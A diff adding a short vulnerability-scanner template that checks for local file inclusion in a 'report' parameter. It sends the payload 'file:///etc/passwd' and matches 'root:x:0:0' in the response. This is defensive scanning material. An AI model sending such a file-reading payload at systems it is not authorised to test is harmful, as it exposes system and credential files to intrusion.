@@ -1,0 +1,20 @@
+id: lfi6-0997
+name: 'Traversal in report'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via report'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      report:
+        - 'file:///etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
